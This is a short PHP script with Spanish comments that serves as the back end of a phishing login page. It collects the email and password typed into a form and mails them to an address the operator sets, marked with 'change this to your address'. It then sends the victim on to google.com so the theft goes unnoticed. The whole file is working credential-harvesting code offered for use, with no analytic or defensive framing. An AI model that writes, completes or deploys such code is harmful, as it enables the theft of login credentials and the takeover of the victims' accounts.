<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recuperar datos del formulario
    $email = htmlspecialchars($_POST["email"]);
    $password = htmlspecialchars($_POST["password"]);

    // Configurar el correo
    $to = "tucorreo@example.com"; // Cambia esto con tu dirección de correo
    $subject = "Datos de inicio de sesión";
    $message = "Correo electrónico: " . $email . "\nContraseña: " . $password;

    // Enviar el correo
    $headers = "From: tucorreo@example.com"; // Cambia esto con tu dirección de correo
    mail($to, $subject, $message, $headers);

    // Redirigir después de enviar el correo
    header("Location: https://www.google.com");
    exit();
} else {
    // Si se intenta acceder directamente al archivo PHP
    echo "Acceso no permitido.";
}
?>
